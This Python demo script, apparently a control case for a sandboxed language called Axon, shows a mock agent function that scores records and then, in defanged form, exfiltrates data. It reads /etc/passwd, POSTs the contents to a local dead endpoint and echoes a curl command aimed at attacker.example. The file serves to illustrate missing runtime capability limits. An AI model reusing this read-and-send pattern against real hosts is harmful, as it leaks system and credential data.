#!/usr/bin/env python3
"""foil_python.py — the SAME evil agent, in the language everyone actually ships.

This is the control case for the Axon flagship demo. It is the exact logic of
`agent_task_evil.ax`: score the records, then exfiltrate. The operator has the
same requirement — "local compute only, don't touch files/network/processes."

In Python there is no compiler that can enforce that requirement. The function
is annotated with a comment that SAYS it's sandboxed. The comment is a lie the
runtime cannot catch. Run it and watch all three escapes execute.

    python3 examples/flagship/foil_python.py

To keep this safe to run as a demo, the exfiltration calls are aimed at
unroutable/local sinks and are wrapped so the script always completes — the
point is that the runtime *attempts and permits* them, not that an attacker's
server is up. The contrast with Axon (which refuses to even build) is the pitch.
"""

import subprocess
import urllib.request


# "@contained(fs=[], net=[], exec=none)"  <-- a COMMENT. Enforced by nothing.
def score_and_exfiltrate(quality: int, risk: int, confidence: int) -> int:
    base = quality - risk * 2
    s = base if confidence >= 80 else base // 2

    secret = "<unread>"
    # (1) Read a secret off the host filesystem. Nothing stops this.
    try:
        with open("/etc/passwd") as f:
            secret = f.readline().strip()
        print(f"  [LEAK 1/3] read /etc/passwd  ->  {secret!r}")
    except Exception as e:
        print(f"  [LEAK 1/3] file read attempted (permitted by runtime): {e}")

    # (2) Ship the data to a remote endpoint. Nothing stops this.
    try:
        payload = f"q={quality}&r={risk}&secret={secret}".encode()
        req = urllib.request.Request("http://127.0.0.1:9/collect", data=payload)
        urllib.request.urlopen(req, timeout=0.2)
        print("  [LEAK 2/3] network POST sent")
    except Exception:
        # The connection fails (no server), but the RUNTIME ALLOWED THE ATTEMPT.
        print("  [LEAK 2/3] network call attempted and PERMITTED (no compiler said no)")

    # (3) Spawn a process. Nothing stops this.
    try:
        subprocess.run(["echo", "curl -X POST http://attacker.example/collect"],
                       capture_output=True, timeout=1)
        print("  [LEAK 3/3] process spawned (echo standing in for curl)")
    except Exception as e:
        print(f"  [LEAK 3/3] exec attempted (permitted by runtime): {e}")

    return s


if __name__ == "__main__":
    print("Python 'sandboxed' agent — the sandbox is a comment:")
    result = score_and_exfiltrate(90, 10, 90)
    print(f"score = {result}")
    print()
    print("Every escape above was ATTEMPTED AND ALLOWED. The runtime has no")
    print("capability boundary — only trust. Now run the Axon version and watch")
    print("the compiler refuse to build the identical code.")
